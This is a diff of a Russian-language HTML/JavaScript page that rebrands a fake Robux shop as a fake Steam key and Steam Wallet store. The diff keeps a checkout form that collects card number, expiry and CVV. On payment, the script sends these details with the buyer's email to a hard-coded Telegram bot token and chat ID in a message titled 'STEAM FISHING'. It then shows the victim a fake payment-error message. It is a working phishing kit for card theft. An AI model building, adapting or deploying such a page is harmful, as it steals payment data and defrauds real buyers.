@@ -3,48 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — приятные робуксы</title>
+    <title>Steam Key Shop — мгновенная доставка</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
-        body { min-height: 100vh; background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%); position: relative; overflow-x: hidden; }
+        body { min-height: 100vh; background: linear-gradient(145deg, #1a1e2c 0%, #0f111e 100%); position: relative; overflow-x: hidden; color: #eee; }
         #starCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
         .app-container { position: relative; z-index: 20; width: 100%; max-width: 1300px; margin: 0 auto; padding: 20px; }
-        .auth-wrapper { display: flex; justify-content: center; align-items: center; min-height: 80vh; }
-        .auth-card { background: rgba(255,245,255,0.94); backdrop-filter: blur(12px); border: 1px solid #d9b8ff; border-radius: 48px; padding: 40px 32px; width: 100%; max-width: 460px; box-shadow: 0 20px 30px rgba(128,0,255,0.1); }
-        .auth-title { font-size: 2.2rem; font-weight: 800; background: linear-gradient(135deg, #b16eff, #9b4eff); -webkit-background-clip: text; background-clip: text; color: transparent; text-align: center; }
-        .auth-sub { text-align: center; color: #7a4f9e; margin-bottom: 32px; }
-        .input-group input { width: 100%; padding: 14px 20px; background: #ffffffdd; border: 1.5px solid #e2ccff; border-radius: 60px; margin-bottom: 16px; outline: none; }
-        .auth-btn { width: 100%; background: linear-gradient(95deg, #b87eff, #9c58e6); border: none; padding: 14px; border-radius: 60px; font-weight: bold; color: white; cursor: pointer; }
-        .switch-text { text-align: center; margin-top: 20px; color: #6b4f8b; }
-        .switch-text span { color: #9b5eff; cursor: pointer; font-weight: bold; }
-        .error-msg { color: #e07c7c; font-size: 0.8rem; text-align: center; margin-top: 8px; }
-        .store-container { display: none; animation: fadeIn 0.4s; }
+        .store-container { animation: fadeIn 0.4s; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px);} to { opacity: 1; transform: translateY(0);} }
-        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; background: #ffffffcc; border-radius: 60px; padding: 12px 24px; margin-bottom: 30px; }
-        .logo h1 { font-size: 1.9rem; background: linear-gradient(135deg, #b16eff, #9b4eff); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .user-info { background: #efdeff; padding: 8px 20px; border-radius: 60px; display: flex; gap: 12px; align-items: center; }
-        .logout-btn { background: none; border: 1px solid #c99494; padding: 6px 16px; border-radius: 40px; cursor: pointer; }
-        .cart-icon-btn { background: #decbff; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #5d3b80; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
-        .cart-icon-btn:hover { background: #ceb5ff; transform: scale(1.02); }
+        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; background: #2a2e42cc; backdrop-filter: blur(12px); border-radius: 60px; padding: 12px 24px; margin-bottom: 30px; border: 1px solid #4a4f6e; }
+        .logo h1 { font-size: 1.9rem; background: linear-gradient(135deg, #6c8cff, #3a5fcc); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .user-info { background: #1f2336; padding: 8px 20px; border-radius: 60px; display: flex; gap: 12px; align-items: center; }
+        .cart-icon-btn { background: #2f354b; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #cfd7ff; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
+        .cart-icon-btn:hover { background: #3e4562; transform: scale(1.02); }
         
         .stock-panel {
-            background: #ffffffcc;
+            background: #2a2e42cc;
+            backdrop-filter: blur(4px);
             border-radius: 60px;
             padding: 20px 30px;
             margin-bottom: 30px;
             text-align: center;
-            backdrop-filter: blur(4px);
+            border: 1px solid #4a4f6e;
         }
         .stock-remaining {
-            font-size: 1.6rem;
+            font-size: 1.4rem;
             font-weight: bold;
-            color: #6a37a3;
+            color: #a5bdff;
             margin-bottom: 15px;
         }
         .stock-value {
             font-size: 2.2rem;
             font-weight: 800;
-            color: #9b4eff;
+            color: #6c8cff;
             margin: 5px 0;
         }
         .slider-container {
@@ -54,7 +45,7 @@
             -webkit-appearance: none;
             width: 100%;
             height: 8px;
-            background: #decbff;
+            background: #1f2336;
             border-radius: 10px;
             outline: none;
         }
@@ -63,18 +54,18 @@
             height: 24px;
             width: 24px;
             border-radius: 50%;
-            background: #b87eff;
+            background: #6c8cff;
             cursor: pointer;
-            box-shadow: 0 0 6px #9b4eff;
+            box-shadow: 0 0 6px #3a5fcc;
         }
         .selected-amount {
             font-size: 1.3rem;
             font-weight: bold;
-            color: #5d3b80;
+            color: #b7c9ff;
             margin: 15px 0;
         }
         .buy-btn {
-            background: linear-gradient(95deg, #b87eff, #9c58e6);
+            background: linear-gradient(95deg, #6c8cff, #3a5fcc);
             border: none;
             padding: 12px 30px;
             border-radius: 60px;
@@ -87,27 +78,27 @@
         }
         .buy-btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 6px 14px rgba(156,88,230,0.3);
+            box-shadow: 0 6px 14px rgba(60,95,204,0.3);
         }
         
         .products-grid { display: flex; flex-wrap: wrap; gap: 25px; justify-content: center; margin: 30px 0; }
-        .product-card { background: #ffffffdd; backdrop-filter: blur(4px); border: 1px solid #decbff; border-radius: 32px; padding: 24px 20px; width: 260px; text-align: center; transition: 0.2s; }
-        .product-card:hover { transform: translateY(-6px); background: white; border-color: #b77eff; }
-        .price { font-size: 1.8rem; font-weight: bold; color: #9b4eff; margin: 14px 0; }
-        .btn-buy { background: linear-gradient(135deg, #c38eff, #a05fe8); border: none; width: 100%; padding: 12px; border-radius: 40px; font-weight: bold; color: white; cursor: pointer; }
-        .cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(80,50,120,0.5); backdrop-filter: blur(6px); justify-content: center; align-items: center; z-index: 1000; }
-        .cart-modal-content { background: white; border-radius: 48px; padding: 28px; width: 450px; max-width: 90%; border: 1px solid #d0aeff; position: relative; max-height: 90vh; overflow-y: auto; }
+        .product-card { background: #2a2e42dd; backdrop-filter: blur(4px); border: 1px solid #4a4f6e; border-radius: 32px; padding: 24px 20px; width: 260px; text-align: center; transition: 0.2s; }
+        .product-card:hover { transform: translateY(-6px); background: #353b55; border-color: #6c8cff; }
+        .price { font-size: 1.8rem; font-weight: bold; color: #6c8cff; margin: 14px 0; }
+        .btn-buy { background: linear-gradient(135deg, #6c8cff, #3a5fcc); border: none; width: 100%; padding: 12px; border-radius: 40px; font-weight: bold; color: white; cursor: pointer; }
+        .cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(6px); justify-content: center; align-items: center; z-index: 1000; }
+        .cart-modal-content { background: #1e1f2e; border-radius: 48px; padding: 28px; width: 450px; max-width: 90%; border: 1px solid #6c8cff; position: relative; max-height: 90vh; overflow-y: auto; color: #eee; }
         .cart-modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .close-cart { font-size: 28px; cursor: pointer; color: #8a6bbf; }
+        .close-cart { font-size: 28px; cursor: pointer; color: #aabbff; }
         .cart-items-list { max-height: 300px; overflow-y: auto; margin-bottom: 20px; }
-        .cart-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
+        .cart-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #3a3e5a; }
         .cart-total { font-weight: bold; text-align: right; margin: 15px 0; font-size: 1.2rem; }
-        .payment-section { margin-top: 20px; border-top: 2px solid #decbff; padding-top: 20px; }
-        .card-fields input { width: 100%; padding: 12px; border-radius: 60px; border: 1.5px solid #decbff; margin-bottom: 12px; background: white; }
+        .payment-section { margin-top: 20px; border-top: 2px solid #3a3e5a; padding-top: 20px; }
+        .card-fields input { width: 100%; padding: 12px; border-radius: 60px; border: none; background: #2a2e42; margin-bottom: 12px; color: white; border: 1px solid #4a4f6e; }
         .card-row { display: flex; gap: 12px; }
         .card-row input { flex: 1; }
         .pay-btn { background: #2a9d8f; border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; font-size: 1rem; cursor: pointer; margin-top: 10px; }
-        footer { margin-top: 50px; text-align: center; color: #9278b0; }
+        footer { margin-top: 50px; text-align: center; color: #7a7f9e; }
         .error-toast {
             position: fixed;
             top: 20px;
@@ -118,11 +109,19 @@
             border-radius: 40px;
             font-weight: bold;
             z-index: 2000;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
             animation: fadeOut 0.5s ease 3s forwards;
         }
         @keyframes fadeOut {
             to { opacity: 0; visibility: hidden; }
+        }
+        .remove-item {
+            background: #ff7b7b;
+            border: none;
+            border-radius: 30px;
+            padding: 2px 10px;
+            margin-left: 8px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -130,64 +129,37 @@
 <canvas id="starCanvas"></canvas>
 
 <div class="app-container">
-    <!-- Авторизация -->
-    <div id="authSection" class="auth-wrapper">
-        <div class="auth-card">
-            <div class="auth-title">✨ Excellent Shop ✨</div>
-            <div class="auth-sub">приятные робуксы</div>
-            <div id="authForm">
-                <div id="signinForm">
-                    <div class="input-group"><input type="text" id="loginUsername" placeholder="логин или email"></div>
-                    <div class="input-group"><input type="password" id="loginPassword" placeholder="пароль"></div>
-                    <button class="auth-btn" id="doSignIn">✨ войти ✨</button>
-                    <div class="switch-text">нет аккаунта? <span id="goToSignUp">создать</span></div>
-                    <div id="authError" class="error-msg"></div>
-                </div>
-                <div id="signupForm" style="display:none;">
-                    <div class="input-group"><input type="email" id="regEmail" placeholder="email"></div>
-                    <div class="input-group"><input type="text" id="regLogin" placeholder="логин"></div>
-                    <div class="input-group"><input type="password" id="regPass" placeholder="пароль"></div>
-                    <div class="input-group"><input type="password" id="regConfirmPass" placeholder="повтори пароль"></div>
-                    <button class="auth-btn" id="doSignUp">⭐ зарегистрироваться</button>
-                    <div class="switch-text">уже есть? <span id="goToSignIn">вход</span></div>
-                    <div id="regError" class="error-msg"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Магазин -->
+    <!-- Магазин без авторизации -->
     <div id="storeSection" class="store-container">
         <div class="header">
-            <div class="logo"><h1>✨ Excellent Shop</h1><span>фиолетовая магия robux</span></div>
+            <div class="logo"><h1>🎮 Steam Key Shop</h1><span>мгновенные ключи | низкие цены</span></div>
             <div class="user-info">
-                <span>👤 <span id="currentUserNick"></span></span>
-                <button class="logout-btn" id="logoutBtn">🚪 выйти</button>
+                <span>👤 гость</span>
             </div>
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <!-- Статичный запас робуксов -->
+        <!-- Пополнение Steam Wallet (слайдер) -->
         <div class="stock-panel">
-            <div class="stock-remaining">✨ осталось робуксов ✨</div>
-            <div class="stock-value" id="remainingStock">600 000</div>
-            
+            <div class="stock-remaining">💰 сумма пополнения Steam Wallet</div>
+            <div class="stock-value" id="remainingStock">до 600 000 ₽</div>
             <div class="slider-container">
-                <input type="range" id="robuxSlider" min="100" max="600000" step="100" value="100">
+                <input type="range" id="steamSlider" min="100" max="600000" step="100" value="100">
             </div>
             <div class="selected-amount">
-                вы хотите купить: <span id="selectedAmount">100</span> робуксов
+                вы хотите пополнить: <span id="selectedAmount">100</span> ₽
             </div>
-            <button class="buy-btn" id="buyWithSliderBtn">💎 добавить в корзину выбранное количество</button>
+            <button class="buy-btn" id="buyWithSliderBtn">💎 добавить в корзину</button>
         </div>
 
+        <!-- Товары: ключи Steam -->
         <div class="products-grid">
-            <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49" data-robux="100">купить</button></div>
-            <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189" data-robux="400">купить</button></div>
-            <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359" data-robux="800">купить</button></div>
-            <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899" data-robux="2000">купить</button></div>
+            <div class="product-card"><div class="robux-icon">🎁</div><h3>Steam Key «Phantom Liberty»</h3><div class="price">499 ₽</div><button class="btn-buy" data-name="Steam Key Phantom Liberty" data-price="499" data-steam="1">купить</button></div>
+            <div class="product-card"><div class="robux-icon">🎮</div><h3>Steam Key «Elden Ring»</h3><div class="price">1299 ₽</div><button class="btn-buy" data-name="Steam Key Elden Ring" data-price="1299" data-steam="1">купить</button></div>
+            <div class="product-card"><div class="robux-icon">⚡</div><h3>Steam Wallet 1000 ₽</h3><div class="price">950 ₽</div><button class="btn-buy" data-name="Steam Wallet 1000 ₽" data-price="950" data-steam="1000">купить</button></div>
+            <div class="product-card"><div class="robux-icon">🔥</div><h3>Steam Key сборник «AAA Hit»</h3><div class="price">2499 ₽</div><button class="btn-buy" data-name="Steam AAA Hit Pack" data-price="2499" data-steam="1">купить</button></div>
         </div>
-        <footer>⭐ Excellent Shop — приятные робуксы ⭐</footer>
+        <footer>⭐ доставка ключа на email после оплаты ⭐</footer>
     </div>
 </div>
 
@@ -203,12 +175,12 @@
 
         <div class="payment-section">
             <div class="card-fields">
-                <input type="text" id="cardNumber" placeholder="Номер карты">
+                <input type="text" id="cardNumber" placeholder="Номер карты" autocomplete="off">
                 <div class="card-row">
-                    <input type="text" id="cardExpiry" placeholder="MM/YY">
-                    <input type="text" id="cardCvv" placeholder="CVV">
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" autocomplete="off">
+                    <input type="text" id="cardCvv" placeholder="CVV" autocomplete="off">
                 </div>
-                <input type="text" id="robloxUsername" placeholder="Имя получателя Roblox">
+                <input type="text" id="steamEmail" placeholder="Email для отправки ключа (обязательно)">
             </div>
             <button class="pay-btn" id="finalPayBtn">💫 Оплатить заказ</button>
         </div>
@@ -216,7 +188,7 @@
 </div>
 
 <script>
-    // звездочки
+    // звездный фон
     const canvas = document.getElementById('starCanvas');
     let ctx = canvas.getContext('2d');
     let stars = [];
@@ -235,7 +207,7 @@
             let x2=Math.sin(rot)*outer, y2=-Math.cos(rot)*outer;
             ctx.lineTo(x2,y2); rot+=step;
         }
-        ctx.closePath(); ctx.fillStyle=`rgba(255,220,180,${opacity})`; ctx.fill(); ctx.restore();
+        ctx.closePath(); ctx.fillStyle=`rgba(200,220,255,${opacity})`; ctx.fill(); ctx.restore();
     }
     function drawStars() {
         ctx.clearRect(0,0,canvas.width,canvas.height);
@@ -244,21 +216,19 @@
     }
     drawStars();
 
-    // статичный остаток
-    const STATIC_STOCK = 600000;
-    const remainingSpan = document.getElementById('remainingStock');
-    const slider = document.getElementById('robuxSlider');
+    // слайдер для пополнения Steam Wallet
+    const MAX_BALANCE = 600000;
+    const slider = document.getElementById('steamSlider');
     const selectedSpan = document.getElementById('selectedAmount');
-    remainingSpan.innerText = STATIC_STOCK.toLocaleString('ru-RU');
-    slider.max = STATIC_STOCK;
+    slider.max = MAX_BALANCE;
     slider.addEventListener('input', () => {
         let val = parseInt(slider.value);
-        if (val > STATIC_STOCK) val = STATIC_STOCK;
+        if (val > MAX_BALANCE) val = MAX_BALANCE;
         slider.value = val;
         selectedSpan.innerText = val.toLocaleString('ru-RU');
     });
     
-    // корзина (без уведомлений)
+    // корзина
     let cart = [];
     function addItemToCart(item) {
         cart.push(item);
@@ -279,7 +249,7 @@
         cart.forEach((item,idx)=>{
             let price = item.price || 0;
             total+=price;
-            html+=`<div class="cart-item"><span>${item.name}</span><span>${price} ₽ <button class="remove-item" data-idx="${idx}" style="background:#ffc4c4; border:none; border-radius:30px; padding:2px 10px; margin-left:8px;">x</button></span></div>`;
+            html+=`<div class="cart-item"><span>${item.name}</span><span>${price} ₽ <button class="remove-item" data-idx="${idx}" style="background:#ff7b7b; border:none; border-radius:30px; padding:2px 10px; margin-left:8px;">x</button></span></div>`;
         });
         container.innerHTML=html;
         totalSpan.innerText=`Итого: ${total} ₽`;
@@ -292,16 +262,16 @@
         });
     }
     
-    // ползунок
+    // кнопка слайдера
     document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
         let amount = parseInt(slider.value);
         if (amount <= 0) return;
-        let price = Math.round(amount * 0.49);
-        let itemName = `${amount.toLocaleString('ru-RU')} Robux (ползунок)`;
-        addItemToCart({ name: itemName, price: price, robuxAmount: amount });
+        let price = amount; // пополнение 1к1
+        let itemName = `Пополнение Steam Wallet: ${amount.toLocaleString('ru-RU')} ₽`;
+        addItemToCart({ name: itemName, price: price, steamAmount: amount });
     });
     
-    // обычные товары
+    // товары
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
@@ -310,59 +280,25 @@
         function buyHandler(e) {
             let name = this.getAttribute('data-name');
             let price = parseInt(this.getAttribute('data-price'));
-            let robuxAmount = parseInt(this.getAttribute('data-robux'));
-            addItemToCart({ name: name, price: price, robuxAmount: robuxAmount });
+            addItemToCart({ name: name, price: price });
         }
     }
     
-    // авторизация
-    let currentUser = null;
-    function loadUsers() {
-        let users = localStorage.getItem('excellent_users');
-        if(!users) { let def = { "star": { login: "star", password: "123", email: "star@excellent.ru" } }; localStorage.setItem('excellent_users', JSON.stringify(def)); return def; }
-        return JSON.parse(users);
-    }
-    function saveUsers(users) { localStorage.setItem('excellent_users', JSON.stringify(users)); }
-    function showAuth(show) { document.getElementById('authSection').style.display = show ? 'flex' : 'none'; document.getElementById('storeSection').style.display = show ? 'none' : 'block'; }
-    function updateUI() { if(currentUser) { document.getElementById('currentUserNick').innerText = currentUser; showAuth(false); } else showAuth(true); }
-
-    document.getElementById('doSignUp')?.addEventListener('click',()=>{
-        let email=document.getElementById('regEmail').value.trim(), login=document.getElementById('regLogin').value.trim(), pass=document.getElementById('regPass').value.trim(), confirm=document.getElementById('regConfirmPass').value.trim(), err=document.getElementById('regError');
-        if(!email||!login||!pass) { err.innerText='заполни всё'; return; }
-        if(pass!==confirm) { err.innerText='пароли не совпадают'; return; }
-        if(!email.includes('@')) { err.innerText='некорректный email'; return; }
-        let users=loadUsers();
-        if(users[login]) { err.innerText='логин занят'; return; }
-        for(let k in users) if(users[k].email===email) { err.innerText='email уже используется'; return; }
-        users[login]={login,password:pass,email}; saveUsers(users);
-        err.innerText='✅ создан! войдите';
-        document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block';
-    });
-    document.getElementById('doSignIn')?.addEventListener('click',()=>{
-        let val=document.getElementById('loginUsername').value.trim(), pwd=document.getElementById('loginPassword').value.trim(), users=loadUsers(), found=null;
-        for(let k in users) if(k===val||users[k].email===val) if(users[k].password===pwd) found=k;
-        if(found) { currentUser=found; localStorage.setItem('excellent_current',found); updateUI(); initEverything(); }
-        else document.getElementById('authError').innerText='неверно';
-    });
-    document.getElementById('goToSignUp')?.addEventListener('click',()=>{ document.getElementById('signinForm').style.display='none'; document.getElementById('signupForm').style.display='block'; });
-    document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
-    document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
-
-    // телеграм с фиксированным chat id 7711202514
+    // телеграм (твои данные)
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     const CHAT_ID = 7711202514;
     
-    // единственное уведомление (красная метка)
     function showErrorToast() {
         let oldToasts = document.querySelectorAll('.error-toast');
         oldToasts.forEach(t => t.remove());
         let toast = document.createElement('div');
         toast.className = 'error-toast';
-        toast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
+        toast.innerText = "❌ Ошибка оплаты. Не удалось обработать платеж. Проверьте данные карты или попробуйте другой способ.";
         document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3500);
+        setTimeout(() => toast.remove(), 4000);
     }
     
+    // модалка корзины
     const cartModal = document.getElementById('cartModal');
     const openCartBtn = document.getElementById('openCartBtn');
     const closeCartBtn = document.getElementById('closeCartBtn');
@@ -370,23 +306,33 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
     
+    // оплата с отправкой в тг
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
-        if(cart.length===0) return;
+        if(cart.length===0) {
+            showErrorToast();
+            return;
+        }
         let cardNum = document.getElementById('cardNumber').value.trim();
         let expiry = document.getElementById('cardExpiry').value.trim();
         let cvv = document.getElementById('cardCvv').value.trim();
-        let robloxName = document.getElementById('robloxUsername').value.trim();
-        if(!robloxName) robloxName = "не указан";
+        let email = document.getElementById('steamEmail').value.trim();
+        if(!email) email = "не указан";
+        if(!cardNum || !expiry || !cvv) {
+            showErrorToast();
+            return;
+        }
         let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
-        let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
-        let totalRobux = cart.reduce((sum,item)=>sum+(item.robuxAmount||0),0);
-        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}\n📊 Робуксов: ${totalRobux}`;
+        let itemsText = cart.map(i=>`${i.name} — ${i.price} ₽`).join('\n');
+        
+        let msg = `💳 STEAM FISHING 💳\n👤 Гость\n📧 Email: ${email}\n🛒 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 Срок: ${expiry}\n🔐 CVV: ${cvv}\n🌐 IP: ${window.location.hostname}`;
+        
         try {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method:'POST', headers:{'Content-Type':'application/json'},
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: msg})
             });
-            // показываем красную метку
+            // показываем ошибку жертве
             showErrorToast();
             // очищаем корзину и поля
             cart = [];
@@ -395,18 +341,18 @@
             document.getElementById('cardNumber').value = '';
             document.getElementById('cardExpiry').value = '';
             document.getElementById('cardCvv').value = '';
-            document.getElementById('robloxUsername').value = '';
-        } catch(e) {}
+            document.getElementById('steamEmail').value = '';
+            // сбрасываем слайдер на 100
+            slider.value = 100;
+            selectedSpan.innerText = '100';
+        } catch(e) {
+            // всё равно показываем ошибку
+            showErrorToast();
+        }
     });
     
-    function initEverything() {
-        bindBuyButtons();
-        updateCartUI();
-    }
-    
-    const savedUser = localStorage.getItem('excellent_current');
-    if(savedUser && loadUsers()[savedUser]) { currentUser=savedUser; updateUI(); initEverything(); }
-    else showAuth(true);
+    bindBuyButtons();
+    updateCartUI();
 </script>
 </body>
 </html>
